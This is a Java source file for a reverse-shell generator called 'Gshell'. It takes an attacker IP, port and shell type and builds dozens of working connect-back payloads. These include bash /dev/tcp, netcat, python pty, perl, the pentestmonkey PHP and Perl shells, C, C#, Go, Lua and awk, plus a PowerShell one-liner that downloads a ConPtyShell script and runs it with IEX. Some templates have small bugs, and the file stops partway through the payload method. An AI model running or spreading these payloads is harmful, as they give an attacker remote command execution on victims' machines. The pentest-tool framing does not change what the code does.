package com.mycompany.gshell;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Paths;
import java.util.Base64;

public class Gshell {
      static private String IP = null; // Default IP Address
      static private String Port = null; // Default Port
      static private String shellType = null; // Default Shell Type
      static private String PATH = null; // Default Working Directory
      static private String ListType = null;
      

    public static void main(String[] args) {


        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "-ip":
                    if (i + 1 < args.length) {
                        IP = args[i + 1];
                        i++; 
                    }
                    break;
                case "-p":
                    if (i + 1 < args.length) {
                        Port = args[i + 1];
                        i++; 
                    }
                    break;
                case "-s":
                    if (i + 1 < args.length) {
                        shellType = args[i + 1];
                        i++; 
                    }
                    break;
                case "-w":
                    if (i + 1 < args.length) {
                        PATH = args[i + 1];
                        i++; 
                    }
                    break; 
                case "-h":
                    printHelp();
                    return; 
                case "-l":
                    if (i + 1 < args.length) {
                        ListType = args[i + 1];
                        showList(ListType);
                        i++;}
                    break;
                default:
                    System.out.println("Invalid option: " + args[i]);
                    printHelp();
                    return; 
            }
        }

       if(IP == null || Port == null || shellType == null || PATH == null)
       {printHelp();}
       else if (ListType != null )
       {showList(ListType);}
       else{ Shells(IP,Port,shellType);
             System.out.println("IP Address: " + IP);
             System.out.println("Port: " +Port);
             System.out.println("File Path: " + Paths.get(PATH).toAbsolutePath().toString());
             System.out.println("Shell Type: " +shellType);}
        
    }


    private static void Write(String PATH,String Output)
    {
    try {
        
            BufferedWriter writer = new BufferedWriter(new FileWriter(PATH));
            writer.write(Output);
            writer.close();
            System.out.println("Output has been written to file: " + PATH);
        } catch (IOException e) {
            System.err.println("Error writing output to file: " + e.getMessage());
            e.printStackTrace();
        }
    
    }

    private static void showList(String Listype) {
        String LinuxList = """
                      =======================================================================
                      1. bash                           27. php_proc_open
                      2. bash_udp                       28. Python_1
                      3. bash_196                       29. Python_2
                      4. bash_read_line                 30. Python3_1
                      5. bash_5                         31. Python3_2
                      6. nc_mkfifo                      32. Ruby
                      7. nc_e                           33. Ruby_no_sh
                      8. busybox                        34. socat
                      9. nc_c                           35. socat_TTY
                      10. ncat_e                        36. sqlite3
                      11. ncat_udp                      37. nodejs
                      12. curl                          38. nodejs2
                      13. rustcat                       39. Java1
                      14. C                             40. Java2
                      15. C_sharp                       41. Java3
                      16. C_sharp_bash                  42. Javascript
                      17. haskell_1                     43. telnet
                      18. perl                          44. zsh
                      19. perl_no_sh                    45. Lua1
                      20. perl_PTMonkey                 46. Lua2
                      21. php_exec                      47. Golang
                      22. php_shell_exec                48. Vlang
                      23. php_PTMonkey                  49. Awk
                      24. php_system                    50. Dart
                      25. php_passthru                  51. Crystal_System
                      26. php_popen                     52. Crystal_Code
                      =======================================================================
                      """;
        String WindowsList = """
                      =======================================================================
                      1. nc_exe_e                       13. Powershell_3        
                      2. ncat_exe_e                     14. Powershell_4TLS
                      3. C_windows                      15. powershell_base64
                      4. C_sharp                        16. Python3_Windows
                      5. C_sharp_bash                   17. nodejs2
                      6. php_PTMonkey                   18. Java3
                      7. php_system                     19. Java_twoway
                      8. php_popen                      20. Javascript
                      9. php_proc_open                  21. Lua2
                      10. Windows_ConPty                22. Golang
                      11. Powershell_1                  23. Dart
                      12. Powershell_2                  24. Crystal_System        
                      =======================================================================
                             """;
        String Maclist = """
                      =======================================================================
                      1. Bash                         23. Python_2
                      2. Bash 196                     24. Python3_1
                      3. Bash read line               25. Python3_2
                      4. bash_5                       26. Ruby 
                      5. Bash_udp                     27. Ruby_no_sh
                      6. nc_mkfifo                    28. Socat
                      7. nc_e                         29. socat_TTY
                      8. nc_c                         30. sqlite3
                      9. ncat_e                       31. nodejs
                      10. ncat_udp                    32. nodejs2
                      11. curl                        33. Java1 
                      12. rustcat                     34. Java2
                      13. C                           35. Java3
                      14. haskell_1                   36. Javascript     
                      15. perl                        37. telnet    
                      16. perl_no_sh                  38. zsh    
                      17. perl_PTMonkey               39. Lua1    
                      18. php_PTMonkey                40. Lua2
                      19. php_passthru                41. Golang
                      20. php_popen                   42. Vlang
                      21. php_proc_open               43. Awk
                      22. Python_1                    44. Dart 
                      =======================================================================
                      """;
        
        if (Listype.equalsIgnoreCase("Linux"))
        System.out.println(LinuxList);
        else if (Listype.equalsIgnoreCase("Windows"))
        System.out.println(WindowsList);
        else if (Listype.equalsIgnoreCase("Mac"))
            System.out.println(Maclist);
        else 
        System.out.println("Valid OS Windows, Mac or Linux");
    }

    private static void printHelp() {
        System.out.println("Usage: Gshell -ip IPAdress -p portnumber -s shelltype -w Path");
        System.out.println("  Options:");
        System.out.println("\t-ip <ip_address>: Set IP Address");
        System.out.println("\t-p <port>: Set Port");
        System.out.println("\t-w <working_directory>: Set Working Directory");
        System.out.println("\t-s <shell_type>: Set Shell Type");
        System.out.println("\t-l <OS Name>: List OS shells");
        System.out.println("\t-h: Show help");
    }
    
    public static void Shells(String ip, String port,String ShellName)
    {
      //======================================================================== Linux Shells  
      var bash = "sh -i >& /dev/tcp/"+ip+"/"+port+" 0>&1";  
      var bash_udp = "sh -i >& /dev/udp/"+ip+"/"+port+" 0>&1";  
      var bash_196 = "0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196";  
      var bash_read_line = "exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do $line 2>&5 >&5; done";  
      var bash_5 = "sh -i 5<> /dev/tcp/"+ip+"/"+port+" 0<&5 1>&5 2>&5";  
      var nc_mkfifo = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc "+ip+" "+port+" >/tmp/f";   
      var nc_e = "nc "+ip+" "+port+" -e sh";  
      var busybox = "busybox nc "+ip+" "+port+" -e sh";  
      var nc_c = "nc -c sh "+ip+" "+port+"";  
      var ncat_e = "ncat "+ip+" "+port+" -e sh"; 
      var ncat_udp ="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u "+ip+""+port+" >/tmp/f";  
      var curl = "C='curl -Ns telnet://"+ip+":"+port+"'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null";  
      var rustcat = "rcat connect -s sh "+ip+" "+port+""; 
      var C = "#include <stdio.h>\n" +
              "#include <sys/socket.h>\n" +
              "#include <sys/types.h>\n" +
              "#include <stdlib.h>\n" +
              "#include <unistd.h>\n" +
              "#include <netinet/in.h>\n" +
              "#include <arpa/inet.h>\n" +
              "\n" +
              "int main(void){\n" +
              "    int port = "+port+";\n" +
              "    struct sockaddr_in revsockaddr;\n" +
              "\n" +
              "    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n" +
              "    revsockaddr.sin_family = AF_INET;       \n" +
              "    revsockaddr.sin_port = htons(port);\n" +
              "    revsockaddr.sin_addr.s_addr = inet_addr(\""+ip+"\");\n" +
              "\n" +
              "    connect(sockt, (struct sockaddr *) &revsockaddr, \n" +
              "    sizeof(revsockaddr));\n" +
              "    dup2(sockt, 0);\n" +
              "    dup2(sockt, 1);\n" +
              "    dup2(sockt, 2);\n" +
              "\n" +
              "    char * const argv[] = {\"sh\", NULL};\n" +
              "    execvp(\"sh\", argv);\n" +
              "\n" +
              "    return 0;       \n" +
              "}"; 
     var C_sharp = "using System;\n" +
                   "using System.Text;\n" +
                   "using System.IO;\n" +
                   "using System.Diagnostics;\n" +
                   "using System.ComponentModel;\n" +
                   "using System.Linq;\n" +
                   "using System.Net;\n" +
                   "using System.Net.Sockets;\n" +
                   "\n" +
                   "\n" +
                   "namespace ConnectBack\n" +
                   "{\n" +
                   "	public class Program\n" +
                   "	{\n" +
                   "		static StreamWriter streamWriter;\n" +
                   "\n" +
                   "		public static void Main(string[] args)\n" +
                   "		{\n" +
                   "			using(TcpClient client = new TcpClient(\""+ip+"\"," +port+"))\n" +
                   "			{\n" +
                   "				using(Stream stream = client.GetStream())\n" +
                   "				{\n" +
                   "					using(StreamReader rdr = new StreamReader(stream))\n" +
                   "					{\n" +
                   "						streamWriter = new StreamWriter(stream);\n" +
                   "						\n" +
                   "						StringBuilder strInput = new StringBuilder();\n" +
                   "\n" +
                   "						Process p = new Process();\n" +
                   "						p.StartInfo.FileName = \"sh\";\n" +
                   "						p.StartInfo.CreateNoWindow = true;\n" +
                   "						p.StartInfo.UseShellExecute = false;\n" +
                   "						p.StartInfo.RedirectStandardOutput = true;\n" +
                   "						p.StartInfo.RedirectStandardInput = true;\n" +
                   "						p.StartInfo.RedirectStandardError = true;\n" +
                   "						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n" +
                   "						p.Start();\n" +
                   "						p.BeginOutputReadLine();\n" +
                   "\n" +
                   "						while(true)\n" +
                   "						{\n" +
                   "							strInput.Append(rdr.ReadLine());\n" +
                   "							//strInput.Append(\"\\n\");\n" +
                   "							p.StandardInput.WriteLine(strInput);\n" +
                   "							strInput.Remove(0, strInput.Length);\n" +
                   "						}\n" +
                   "					}\n" +
                   "				}\n" +
                   "			}\n" +
                   "		}\n" +
                   "\n" +
                   "		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n" +
                   "        {\n" +
                   "            StringBuilder strOutput = new StringBuilder();\n" +
                   "\n" +
                   "            if (!String.IsNullOrEmpty(outLine.Data))\n" +
                   "            {\n" +
                   "                try\n" +
                   "                {\n" +
                   "                    strOutput.Append(outLine.Data);\n" +
                   "                    streamWriter.WriteLine(strOutput);\n" +
                   "                    streamWriter.Flush();\n" +
                   "                }\n" +
                   "                catch (Exception err) { }\n" +
                   "            }\n" +
                   "        }\n" +
                   "\n" +
                   "	}\n" +
                   "}";   
        
     var C_sharp_bash = "using System;\n" +
                        "using System.Diagnostics;\n" +
                        "\n" +
                        "namespace BackConnect {\n" +
                        "  class ReverseBash {\n" +
                        "	public static void Main(string[] args) {\n" +
                        "	  Process proc = new System.Diagnostics.Process();\n" +
                        "	  proc.StartInfo.FileName = \"sh\";\n" +
                        "	  proc.StartInfo.Arguments = \"-c \\\"sh -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\\\"\";\n" +
                        "	  proc.StartInfo.UseShellExecute = false;\n" +
                        "	  proc.StartInfo.RedirectStandardOutput = true;\n" +
                        "	  proc.Start();\n" +
                        "\n" +
                        "	  while (!proc.StandardOutput.EndOfStream) {\n" +
                        "		Console.WriteLine(proc.StandardOutput.ReadLine());\n" +
                        "	  }\n" +
                        "	}\n" +
                        "  }\n" +
                        "}";  
        
     var haskell_1 = "module Main where\n" +
                     "\n" +
                     "import System.Process\n" +
                     "\n" +
                     "main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc "+ip+" "+port+" >/tmp/f\"" ;  
        
     var perl ="perl -e 'use Socket;$i=\""+ip+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
             + "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'";    
     var perl_no_sh = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\""+ip+":"+port+"\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'";   
     var perl_PTMonkey = "# Copyright (C) 2006 pentestmonkey@pentestmonkey.net"
                         + "use strict;\n" +
                         "use Socket;\n" +
                         "use FileHandle;\n" +
                         "use POSIX;\n" +
                         "my $VERSION = \"1.0\";\n" +
                         "\n" +
                         "my $ip = '"+ip+"';\n" +
                         "my $port = "+port+";\n" +
                         "\n" +
                         "my $daemon = 1;\n" +
                         "my $auth   = 0; # 0 means authentication is disabled and any \n" +
                         "		# source IP can access the reverse shell\n" +
                         "my $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);\n" +
                         "\n" +
                         "my $global_page = \"\";\n" +
                         "my $fake_process_name = \"/usr/sbin/apache\";\n" +
                         "\n" +
                         "$0 = \"[httpd]\";\n" +
                         "\n" +
                         "if (defined($ENV{'REMOTE_ADDR'})) {\n" +
                         "	cgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\");\n" +
                         "\n" +
                         "	if ($auth) {\n" +
                         "		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {\n" +
                         "			cgiprint(\"ERROR: Your client isn't authorised to view this page\");\n" +
                         "			cgiexit();\n" +
                         "		}\n" +
                         "	 }\n" +
                         "} elsif ($auth) {\n" +
                         "	 cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\");\n" +
                         "	 cgiexit(0);\n" +
                         "}\n" +
                         "\n" +
                         "if ($daemon) {\n" +
                         " 	 my $pid = fork();\n" +
                         "	 if ($pid) {\n" +
                         "		 cgiexit(0); # parent exits\n" +
                         "	 }\n" +
                         "\n" +
                         "	setsid();\n" +
                         "	chdir('/');\n" +
                         "	umask(0);\n" +
                         "}\n" +
                         "\n" +
                         "socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\n" +
                         "if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\n" +
                         "	cgiprint(\"Sent reverse shell to $ip:$port\");\n" +
                         "	cgiprintpage();\n" +
                         "} else {\n" +
                         "	 cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\");\n" +
                         "	 cgiexit();	\n" +
                         "}\n" +
                         "\n" +
                         "open(STDIN, \">&SOCK\");\n" +
                         "open(STDOUT,\">&SOCK\");\n" +
                         "open(STDERR,\">&SOCK\");\n" +
                         "$ENV{'HISTFILE'} = '/dev/null';\n" +
                         "system(\"w;uname -a;id;pwd\");\n" +
                         "exec({\"sh\"} ($fake_process_name, \"-i\"));\n" +
                         "\n" +
                         "sub cgiprint {\n" +
                         "	 my $line = shift;\n" +
                         "	 $line .= \"<p>\\n\";\n" +
                         "	 $global_page .= $line;\n" +
                         "}\n" +
                         "\n" +
                         "sub cgiexit {\n" +
                         "	 cgiprintpage();\n" +
                         "	 exit 0; # 0 to ensure we don't give a 500 response.\n" +
                         "}\n" +
                         "\n" +
                         "sub cgiprintpage {\n" +
                         "	 print \"Content-Length: \" . length($global_page) . \"\\r\n" +
                         "Connection: close\\r\n" +
                         "Content-Type: text\\/html\\r\\n\\r\\n\" . $global_page;\n" +
                         "}";   
     
     var php_exec ="php -r '$sock=fsockopen(\""+ip+"\","+port+");exec(\"sh <&3 >&3 2>&3\");'";  
     var php_shell_exec = "php -r '$sock=fsockopen(\""+ip+"\","+port+");shell_exec(\"sh <&3 >&3 2>&3\");'";  
     var php_PTMonkey = "# Copyright (C) 2006 pentestmonkey@pentestmonkey.net"
             + "<?php\n" +
        "set_time_limit (0);\n" +
        "$VERSION = \"1.0\";\n" +
        "$ip = '"+ ip +"'; \n" +
        "$port = "+port+"\n" +
        "$chunk_size = 1400;\n" +
        "$write_a = null;\n" +
        "$error_a = null;\n" +
        "$shell = 'uname -a; w; id; /bin/sh -i';\n" +
        "$daemon = 0;\n" +
        "$debug = 0;\n" +
        "if (function_exists('pcntl_fork')) {\n" +
        "	$pid = pcntl_fork();\n" +
        "	if ($pid == -1) {\n" +
        "		printit(\"ERROR: Can't fork\");\n" +
        "		exit(1);}\n" +
        "	if ($pid) {\n" +
        "		exit(0);}\n" +
        "	if (posix_setsid() == -1) {\n" +
        "		printit(\"Error: Can't setsid()\");\n" +
        "		exit(1);}\n" +
        "\n" +
        "	$daemon = 1;} \n" +
        "else {\n" +
        "	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}\n" +
        "\n" +
        "chdir(\"/\");\n" +
        "umask(0);\n" +
        "$sock = fsockopen($ip, $port, $errno, $errstr, 30);\n" +
        "if (!$sock) {\n" +
        "	printit(\"$errstr ($errno)\");\n" +
        "	exit(1);}\n" +
        "$descriptorspec = array(\n" +
        "   0 => array(\"pipe\", \"r\"),  \n" +
        "   1 => array(\"pipe\", \"w\"),  \n" +
        "   2 => array(\"pipe\", \"w\"));\n" +
        "$process = proc_open($shell, $descriptorspec, $pipes);\n" +
        "if (!is_resource($process)) {\n" +
        "	printit(\"ERROR: Can't spawn shell\");\n" +
        "	exit(1);}\n" +
        "stream_set_blocking($pipes[0], 0);\n" +
        "stream_set_blocking($pipes[1], 0);\n" +
        "stream_set_blocking($pipes[2], 0);\n" +
        "stream_set_blocking($sock, 0);\n" +
        "printit(\"Successfully opened reverse shell to $ip:$port\");\n" +
        "while (1) {\n" +
        "	if (feof($sock)) {\n" +
        "		printit(\"ERROR: Shell connection terminated\");\n" +
        "		break;}\n" +
        "	if (feof($pipes[1])) {\n" +
        "		printit(\"ERROR: Shell process terminated\");\n" +
        "		break;}\n" +
        "	$read_a = array($sock, $pipes[1], $pipes[2]);\n" +
        "	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n" +
        "\n" +
        "	if (in_array($sock, $read_a)) {\n" +
        "		if ($debug) printit(\"SOCK READ\");\n" +
        "		$input = fread($sock, $chunk_size);\n" +
        "		if ($debug) printit(\"SOCK: $input\");\n" +
        "		fwrite($pipes[0], $input);}\n" +
        "	if (in_array($pipes[1], $read_a)) {\n" +
        "		if ($debug) printit(\"STDOUT READ\");\n" +
        "		$input = fread($pipes[1], $chunk_size);\n" +
        "		if ($debug) printit(\"STDOUT: $input\");\n" +
        "		fwrite($sock, $input);}\n" +
        "	if (in_array($pipes[2], $read_a)) {\n" +
        "		if ($debug) printit(\"STDERR READ\");\n" +
        "		$input = fread($pipes[2], $chunk_size);\n" +
        "		if ($debug) printit(\"STDERR: $input\");\n" +
        "		fwrite($sock, $input);}\n" +
        "}\n" +
        "fclose($sock);\n" +
        "fclose($pipes[0]);\n" +
        "fclose($pipes[1]);\n" +
        "fclose($pipes[2]);\n" +
        "proc_close($process);\n" +
        "function printit ($string) {\n" +
        "	if (!$daemon) {\n" +
        "		print \"$string\\n\";}\n" +
        "}\n" +
        "?> ";
    
     var php_system ="php -r '$sock=fsockopen(\""+ip+"\","+port+");system(\"sh <&3 >&3 2>&3\");'";
     var php_passthru ="php -r '$sock=fsockopen(\""+ip+"\","+port+");passthru(\"sh <&3 >&3 2>&3\");'";
     var php_popen = "php -r '$sock=fsockopen(\""+ip+"\","+port+");popen(\"sh <&3 >&3 2>&3\", \"r\");'";
     var php_proc_open = "php -r '$sock=fsockopen(\""+ip+"\","+port+");$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'";
     var Python_1 = "export RHOST=\""+ip+"\";export RPORT="+port+";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'";
     var Python_2 = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'";
     var Python3_1 = "export RHOST=\""+ip+"\";export RPORT="+port+";python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'";
     var Python3_2 = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'";
     var Ruby = "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+ip+"\","+port+"))'";
     var Ruby_no_sh = "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\""+ip+"\",\""+port+"\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'";
     var socat = "socat TCP:"+ip+":"+port+" EXEC:sh";
     var socat_TTY = "socat TCP:"+ip+":"+port+" EXEC:'sh',pty,stderr,setsid,sigint,sane";
     var sqlite3 = "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc "+ip+" "+port+" >/tmp/f'";
     var nodejs = "require('child_process').exec('nc -e sh "+ip+" "+port+"')";
     var nodejs2 = "(function(){\n" +
                   "    var net = require(\"net\"),\n" +
                   "        cp = require(\"child_process\"),\n" +
                   "        sh = cp.spawn(\"sh\", []);\n" +
                   "    var client = new net.Socket();\n" +
                   "    client.connect("+port+", \""+ip+"\", function(){\n" +
                   "        client.pipe(sh.stdin);\n" +
                   "        sh.stdout.pipe(client);\n" +
                   "        sh.stderr.pipe(client);\n" +
                   "    });\n" +
                   "    return /a/; // Prevents the Node.js application from crashing\n" +
                   "})();";
     var Java1 = "public class shell {\n" +
                 "    public static void main(String[] args) {\n" +
                 "        Process p;\n" +
                 "        try {\n" +
                 "            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\");\n" +
                 "            p.waitFor();\n" +
                 "            p.destroy();\n" +
                 "        } catch (Exception e) {}\n" +
                 "    }\n" +
                 "}";
     var Java2 = "public class shell {\n" +
                 "    public static void main(String[] args) {\n" +
                 "        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\")\n" +
                 "            .redirectErrorStream(true);\n" +
                 "        try {\n" +
                 "            Process p = pb.start();\n" +
                 "            p.waitFor();\n" +
                 "            p.destroy();\n" +
                 "        } catch (Exception e) {}\n" +
                 "    }\n" +
                 "}";
     var Java3 = "import java.io.InputStream;\n" +
                 "import java.io.OutputStream;\n" +
                 "import java.net.Socket;\n" +
                 "\n" +
                 "public class shell {\n" +
                 "    public static void main(String[] args) {\n" +
                 "        String host = \""+ip+"\";\n" +
                 "        int port = "+port+";\n" +
                 "        String cmd = \"sh\";\n" +
                 "        try {\n" +
                 "            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n" +
                 "            Socket s = new Socket(host, port);\n" +
                 "            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n" +
                 "            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n" +
                 "            while (!s.isClosed()) {\n" +
                 "                while (pi.available() > 0)\n" +
                 "                    so.write(pi.read());\n" +
                 "                while (pe.available() > 0)\n" +
                 "                    so.write(pe.read());\n" +
                 "                while (si.available() > 0)\n" +
                 "                    po.write(si.read());\n" +
                 "                so.flush();\n" +
                 "                po.flush();\n" +
                 "                Thread.sleep(50);\n" +
                 "                try {\n" +
                 "                    p.exitValue();\n" +
                 "                    break;\n" +
                 "                } catch (Exception e) {}\n" +
                 "            }\n" +
                 "            p.destroy();\n" +
                 "            s.close();\n" +
                 "        } catch (Exception e) {}\n" +
                 "    }\n" +
                 "}";
     var Javascript= "String command = \"var host = '"+ip+"';\" +\n" +
                     "                       \"var port = "+port+";\" +\n" +
                     "                       \"var cmd = 'sh';\"+\n" +
                     "                       \"var s = new java.net.Socket(host, port);\" +\n" +
                     "                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\n" +
                     "                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\n" +
                     "                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\n" +
                     "                       \"print ('Connected');\"+\n" +
                     "                       \"while (!s.isClosed()) {\"+\n" +
                     "                       \"    while (pi.available() > 0)\"+\n" +
                     "                       \"        so.write(pi.read());\"+\n" +
                     "                       \"    while (pe.available() > 0)\"+\n" +
                     "                       \"        so.write(pe.read());\"+\n" +
                     "                       \"    while (si.available() > 0)\"+\n" +
                     "                       \"        po.write(si.read());\"+\n" +
                     "                       \"    so.flush();\"+\n" +
                     "                       \"    po.flush();\"+\n" +
                     "                       \"    java.lang.Thread.sleep(50);\"+\n" +
                     "                       \"    try {\"+\n" +
                     "                       \"        p.exitValue();\"+\n" +
                     "                       \"        break;\"+\n" +
                     "                       \"    }\"+\n" +
                     "                       \"    catch (e) {\"+\n" +
                     "                       \"    }\"+\n" +
                     "                       \"}\"+\n" +
                     "                       \"p.destroy();\"+\n" +
                     "                       \"s.close();\";\n" +
                     "String x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\n" +
                     "ref.add(new StringRefAddr(\"x\", x);";
     var telnet = "TF=$(mktemp -u);mkfifo $TF && telnet "+ip+" "+port+" 0<$TF | sh 1>$TF";
     var zsh = "zsh -c 'zmodload zsh/net/tcp && ztcp "+ip+" "+port+" && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'";
     var Lua1 = "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('"+ip+"','"+port+"');os.execute('sh -i <&3 >&3 2>&3');\"";
     var Lua2 = "lua5.1 -e 'local host, port = \""+ip+"\", "+port+" local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'";
     var Golang = "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\""+ip+":"+port+"\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go";
     var Vlang = "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e sh "+ip+" "+port+" 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v";
     var Awk = "awk 'BEGIN {s = \"/inet/tcp/0/"+ip+"/"+port+"\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null";
     var Dart = "import 'dart:io';\n" +
                "import 'dart:convert';\n" +
                "\n" +
                "main() {\n" +
                "  Socket.connect(\""+ip+"\", "+port+").then((socket) {\n" +
                "    socket.listen((data) {\n" +
                "      Process.start('sh', []).then((Process process) {\n" +
                "        process.stdin.writeln(new String.fromCharCodes(data).trim());\n" +
                "        process.stdout\n" +
                "          .transform(utf8.decoder)\n" +
                "          .listen((output) { socket.write(output); });\n" +
                "      });\n" +
                "    },\n" +
                "    onDone: () {\n" +
                "      socket.destroy();\n" +
                "    });\n" +
                "  });\n" +
                "}";
     var Crystal_System = "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\""+ip+"\","+port+");loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'";
     var Crystal_Code = "require \"process\"\n" +
                        "require \"socket\"\n" +
                        "\n" +
                        "c = Socket.tcp(Socket::Family::INET)\n" +
                        "c.connect(\""+ip+"\", "+ip+")\n" +
                        "loop do \n" +
                        "  m, l = c.receive\n" +
                        "  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n" +
                        "  c << p.output.gets_to_end\n" +
                        "end";
     //========================================================================= Windows Shells        
     var nc_exe_e = "nc.exe "+ip+" "+port+" -e sh";
     var ncat_exe_e = "ncat.exe "+ip+" "+port+" -e sh";
     var C_windows = "#include <winsock2.h>\n" +
                     "#include <stdio.h>\n" +
                     "#pragma comment(lib,\"ws2_32\")\n" +
                     "\n" +
                     "WSADATA wsaData;\n" +
                     "SOCKET Winsock;\n" +
                     "struct sockaddr_in hax; \n" +
                     "char ip_addr[16] = \""+ip+"\"; \n" +
                     "char port[6] = \""+port+"\";            \n" +
                     "\n" +
                     "STARTUPINFO ini_processo;\n" +
                     "\n" +
                     "PROCESS_INFORMATION processo_info;\n" +
                     "\n" +
                     "int main()\n" +
                     "{\n" +
                     "    WSAStartup(MAKEWORD(2, 2), &wsaData);\n" +
                     "    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n" +
                     "\n" +
                     "\n" +
                     "    struct hostent *host; \n" +
                     "    host = gethostbyname(ip_addr);\n" +
                     "    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\n" +
                     "\n" +
                     "    hax.sin_family = AF_INET;\n" +
                     "    hax.sin_port = htons(atoi(port));\n" +
                     "    hax.sin_addr.s_addr = inet_addr(ip_addr);\n" +
                     "\n" +
                     "    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\n" +
                     "\n" +
                     "    memset(&ini_processo, 0, sizeof(ini_processo));\n" +
                     "    ini_processo.cb = sizeof(ini_processo);\n" +
                     "    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \n" +
                     "    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n" +
                     "\n" +
                     "    TCHAR cmd[255] = TEXT(\"cmd.exe\");\n" +
                     "\n" +
                     "    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n" +
                     "\n" +
                     "    return 0;\n" +
                     "}";
    var Windows_ConPty = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell "+ip+" "+port+"";
